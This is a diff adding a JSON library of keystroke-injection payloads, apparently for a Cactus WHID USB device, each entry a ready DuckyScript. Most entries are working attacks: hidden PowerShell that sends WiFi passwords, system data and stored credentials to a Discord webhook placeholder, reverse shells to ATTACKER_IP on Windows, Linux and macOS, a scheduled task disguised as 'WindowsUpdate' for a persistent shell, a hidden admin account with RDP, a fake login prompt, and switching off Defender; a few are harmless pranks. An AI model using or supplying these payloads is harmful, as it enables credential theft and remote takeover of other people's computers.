@@ -1,0 +1,128 @@
+[
+  {
+    "name": "win-sysinfo-discord.txt",
+    "category": "Recon & Exfil",
+    "os": "Windows",
+    "description": "Gathers hostname, username, IP, OS version and sends to Discord webhook",
+    "content": "REM Windows System Info Exfil\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$info = systeminfo | Out-String; $ip = (Invoke-WebRequest -Uri 'http://ifconfig.me/ip' -UseBasicParsing).Content; $body = @{content=\\\"$env:COMPUTERNAME | $env:USERNAME | $ip`n$info\\\"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body\"\nENTER"
+  },
+  {
+    "name": "win-wifi-pass-grabber.txt",
+    "category": "Recon & Exfil",
+    "os": "Windows",
+    "description": "Extracts all saved WiFi SSIDs and cleartext passwords, sends to Discord",
+    "content": "REM WiFi Password Grabber\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$r='';(netsh wlan show profiles)|Select-String '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\\W+\\:(.+)$';if($p){$r+=\\\"$n : $($p.Matches.Groups[1].Value.Trim())`n\\\"}};$body=@{content=$r}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body\"\nENTER"
+  },
+  {
+    "name": "win-geoip-exfil.txt",
+    "category": "Recon & Exfil",
+    "os": "Windows",
+    "description": "Grabs public IP, city, region, ISP via ip-api.com, sends to Discord",
+    "content": "REM Public IP and Geolocation\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$g=Invoke-RestMethod 'http://ip-api.com/json';$msg=\\\"IP: $($g.query) | City: $($g.city) | ISP: $($g.isp)\\\";$body=@{content=$msg}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body\"\nENTER"
+  },
+  {
+    "name": "win-exfil-to-cactus.txt",
+    "category": "Recon & Exfil",
+    "os": "Windows",
+    "description": "Extracts WiFi passwords and sends them back to the Cactus SPIFFS via /exfiltrate",
+    "content": "REM Exfil WiFi Creds to Cactus SPIFFS\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$r='';(netsh wlan show profiles)|Select-String '\\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\\W+\\:(.+)$';if($p){$r+=\\\"$n`:$($p.Matches.Groups[1].Value.Trim()),\\\"}};Invoke-WebRequest -Uri \\\"http://192.168.1.1/exfiltrate?file=wificreds.txt&data=$r\\\" -UseBasicParsing\"\nENTER"
+  },
+  {
+    "name": "win-network-recon.txt",
+    "category": "Recon & Exfil",
+    "os": "Windows",
+    "description": "Runs ipconfig, netstat, arp, route print and exfils to Discord",
+    "content": "REM Network Recon Dump\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$f=\\\"$env:TEMP\\nr.txt\\\";ipconfig /all > $f; netstat -an >> $f; arp -a >> $f; $d=Get-Content $f -Raw; $body=@{content=$d.Substring(0,[Math]::Min(1900,$d.Length))}|ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body; Remove-Item $f\"\nENTER"
+  },
+  {
+    "name": "win-ps-revshell.txt",
+    "category": "Reverse Shells",
+    "os": "Windows",
+    "description": "PowerShell reverse TCP shell. Listener: nc -lvp 4444",
+    "content": "REM PowerShell Reverse Shell\nREM Replace: ATTACKER_IP and 4444\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"\nENTER"
+  },
+  {
+    "name": "linux-bash-revshell.txt",
+    "category": "Reverse Shells",
+    "os": "Linux",
+    "description": "Opens terminal and launches bash reverse shell via /dev/tcp",
+    "content": "REM Linux Bash Reverse Shell\nREM Replace: ATTACKER_IP and 4444\nDELAY 1000\nCTRL ALT t\nDELAY 800\nSTRING nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\nENTER\nDELAY 200\nSTRING exit\nENTER"
+  },
+  {
+    "name": "macos-python-revshell.txt",
+    "category": "Reverse Shells",
+    "os": "macOS",
+    "description": "Opens Terminal via Spotlight and runs Python3 reverse shell",
+    "content": "REM macOS Python Reverse Shell\nREM Replace: ATTACKER_IP and 4444\nDELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &\nENTER\nDELAY 200\nSTRING exit\nENTER"
+  },
+  {
+    "name": "win-persistent-revshell.txt",
+    "category": "Reverse Shells",
+    "os": "Windows",
+    "description": "Creates scheduled task for persistent reverse shell on every logon",
+    "content": "REM Persistent Reverse Shell via Scheduled Task\nREM Replace: ATTACKER_IP and 4444\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /c schtasks /create /tn \"WindowsUpdate\" /tr \"powershell -NoP -W Hidden -C while(1){try{$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 30}}\" /sc onlogon /rl highest /f\nENTER"
+  },
+  {
+    "name": "win-add-hidden-admin.txt",
+    "category": "Reverse Shells",
+    "os": "Windows",
+    "description": "Creates hidden local admin account and enables RDP. Requires UAC.",
+    "content": "REM Add Hidden Admin + Enable RDP\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C net user hak5admin P@ssw0rd123! /add; net localgroup administrators hak5admin /add; reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal` Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'\"\nENTER\nDELAY 1000\nALT y"
+  },
+  {
+    "name": "win-fake-login-prompt.txt",
+    "category": "Credential Harvesting",
+    "os": "Windows",
+    "description": "Shows fake Windows credential dialog, sends captured creds to Discord",
+    "content": "REM Fake Windows Credential Prompt\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$cred=$Host.UI.PromptForCredential('Windows Security','Windows requires your credentials.',$env:USERNAME,$env:USERDOMAIN);if($cred){$p=$cred.GetNetworkCredential().Password;$body=@{content=\\\"$env:USERDOMAIN\\$env:USERNAME : $p\\\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body}\"\nENTER"
+  },
+  {
+    "name": "win-credvault-dump.txt",
+    "category": "Credential Harvesting",
+    "os": "Windows",
+    "description": "Enumerates Windows Credential Manager entries and sends to Discord",
+    "content": "REM Credential Vault Dump\nREM Replace: DISCORD_WEBHOOK_URL_HERE\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$v=cmdkey /list | Out-String;$body=@{content=$v.Substring(0,[Math]::Min(1900,$v.Length))}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body\"\nENTER"
+  },
+  {
+    "name": "win-rickroll.txt",
+    "category": "Utility & Demo",
+    "os": "Windows",
+    "description": "Maxes volume and opens Rick Astley in the default browser",
+    "content": "REM Classic Rickroll\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -C \"$w=New-Object -ComObject WScript.Shell;for($i=0;$i-lt50;$i++){$w.SendKeys([char]175)};Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'\"\nENTER"
+  },
+  {
+    "name": "win-messagebox.txt",
+    "category": "Utility & Demo",
+    "os": "Windows",
+    "description": "Pops a Windows message box - good for proof-of-concept demos",
+    "content": "REM Security Alert Message Box\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -C \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('This device is vulnerable to USB HID injection.','Cactus WHID - Security Alert','OK','Warning')\"\nENTER"
+  },
+  {
+    "name": "win-wallpaper-changer.txt",
+    "category": "Utility & Demo",
+    "os": "Windows",
+    "description": "Downloads image from URL and sets as desktop wallpaper",
+    "content": "REM Wallpaper Changer\nREM Replace: IMAGE_URL_HERE with direct .jpg link\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"$url='IMAGE_URL_HERE';$path=\\\"$env:TEMP\\wp.jpg\\\";Invoke-WebRequest -Uri $url -OutFile $path;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}';[W]::SystemParametersInfo(0x0014,0,$path,0x0003)\"\nENTER"
+  },
+  {
+    "name": "macos-rickroll.txt",
+    "category": "Utility & Demo",
+    "os": "macOS",
+    "description": "Opens Safari via Spotlight and navigates to Rick Astley",
+    "content": "REM macOS Rickroll\nDELAY 1000\nGUI SPACE\nDELAY 500\nSTRING safari\nENTER\nDELAY 1500\nGUI l\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER"
+  },
+  {
+    "name": "win-disable-defender.txt",
+    "category": "Utility & Demo",
+    "os": "Windows",
+    "description": "Disables Defender real-time monitoring. Requires UAC admin.",
+    "content": "REM Disable Windows Defender RTP\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -W Hidden -Exec Bypass -C \"Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C Set-MpPreference -DisableRealtimeMonitoring $true'\"\nENTER\nDELAY 1000\nALT y"
+  },
+  {
+    "name": "linux-nc-revshell.txt",
+    "category": "Reverse Shells",
+    "os": "Linux",
+    "description": "Opens terminal and runs netcat reverse shell via mkfifo",
+    "content": "REM Linux Netcat Reverse Shell\nREM Replace: ATTACKER_IP and 4444\nDELAY 1000\nCTRL ALT t\nDELAY 800\nSTRING rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f &\nENTER\nDELAY 200\nSTRING exit\nENTER"
+  }
+]
